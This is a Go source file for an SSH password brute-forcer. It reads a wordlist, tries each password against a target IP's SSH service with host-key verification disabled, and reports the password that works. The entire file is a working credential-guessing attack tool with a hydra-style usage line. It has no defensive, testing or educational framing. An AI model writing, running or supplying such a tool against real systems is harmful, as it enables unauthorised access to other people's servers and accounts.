package main

import (
	"fmt"
	"io/ioutil"
	"strings"
	"golang.org/x/crypto/ssh"
	"flag"
	"time"
)

// Function to attempt SSH login
func tryLogin(username, password, targetIP string) bool {
	// Setup the SSH client configuration
	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         5 * time.Second,
	}

	// Connect to the SSH server
	conn, err := ssh.Dial("tcp", targetIP+":22", config)
	if err != nil {
		return false
	}
	defer conn.Close()

	// Successful login if we reached this point
	return true
}

func main() {
	// Define command line flags
	username := flag.String("l", "", "Username for SSH login")
	passwordList := flag.String("P", "", "File with list of passwords")
	targetIP := flag.String("target", "", "Target IP address for SSH login")

	flag.Parse()

	// Validate flags
	if *username == "" || *passwordList == "" || *targetIP == "" {
		fmt.Println("Usage: ssh.go -l username -P passwordlist -target <target_ip>")
		return
	}

	// Read the password list file
	passwords, err := ioutil.ReadFile(*passwordList)
	if err != nil {
		fmt.Println("Error reading password list:", err)
		return
	}

	// Split the passwords into a slice
	passwordListSlice := strings.Split(string(passwords), "\n")

	// Iterate through each password in the list
	for _, password := range passwordListSlice {
		password = strings.TrimSpace(password) // Remove any leading/trailing spaces

		if password == "" {
			continue
		}

		// Try the password
		fmt.Printf("Trying password: %s...\n", password)

		if tryLogin(*username, password, *targetIP) {
			// If login is successful
			fmt.Printf("\033[32mKEY FOUND: %s\033[0m\n", password) // Green output for success
			return
		}
	}

	// If no password was found
	fmt.Printf("\033[31mKEY NOT FOUND\033[0m\n") // Red output for failure
}
